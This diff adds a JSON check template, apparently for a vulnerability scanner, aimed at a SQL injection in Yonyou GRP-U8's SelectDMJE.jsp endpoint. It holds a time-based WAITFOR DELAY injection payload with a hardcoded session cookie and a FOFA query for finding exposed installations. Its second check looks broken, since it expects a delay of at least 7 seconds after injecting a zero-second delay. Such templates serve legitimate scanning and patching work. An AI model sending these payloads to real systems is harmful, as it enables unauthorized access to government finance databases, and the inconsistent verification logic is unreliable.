@@ -1,0 +1,64 @@
+{
+  "product": "用友GRP U8",
+  "vul_name": "用友GRP U8 SelectDMJE.jsp SQL注入",
+  "type": "SQL注入",
+  "vul_id": [],
+  "level": 3,
+  "vul_desc": "用友GRP-U8R10行政事业内控管理软件在SelectDMJE.jsp接口存在潜在的SQL注入漏洞，未经授权的攻击者有可能利用这个漏洞获取对数据库的权限。进一步的攻击可能导致攻击者获取服务器权限，带来严重的安全风险。",
+  "version": "用友GRP-U8R10产品官方在售及提供服务的版本为U8Manager，产品分B、C、G三个产品系列",
+  "note": "",
+  "search": {
+    "FOFA": "app=\"用友-GRP-U8\""
+  },
+  "protocol": "http",
+  "link": "https://blog.csdn.net/qq_39573664/article/details/135770530",
+  "fix": [
+    "建议联系软件厂商进行处理。"
+  ],
+  "model": "",
+  "logic": "and",
+  "exploit": [
+    {
+      "exp": {
+        "method": "get",
+        "follow": false,
+        "path": "/u8qx/SelectDMJE.jsp?kjnd=1%27;WAITFOR%20DELAY%20%270:0:8%27--",
+        "cookie": "JSESSIONID=13387E12A98BB3F6614C5D44EA3A5906"
+      },
+      "verify": {
+        "path": "",
+        "logic": "and",
+        "check": [
+          {
+            "status": 200,
+            "time": {
+              "check": ">=",
+              "num": 8
+            }
+          }
+        ]
+      }
+    },
+    {
+      "exp": {
+        "method": "get",
+        "follow": false,
+        "path": "/u8qx/SelectDMJE.jsp?kjnd=1%27;WAITFOR%20DELAY%20%270:0:0%27--",
+        "cookie": "JSESSIONID=13387E12A98BB3F6614C5D44EA3A5906"
+      },
+      "verify": {
+        "path": "",
+        "logic": "and",
+        "check": [
+          {
+            "status": 200,
+            "time": {
+              "check": ">=",
+              "num": 7
+            }
+          }
+        ]
+      }
+    }
+  ]
+}
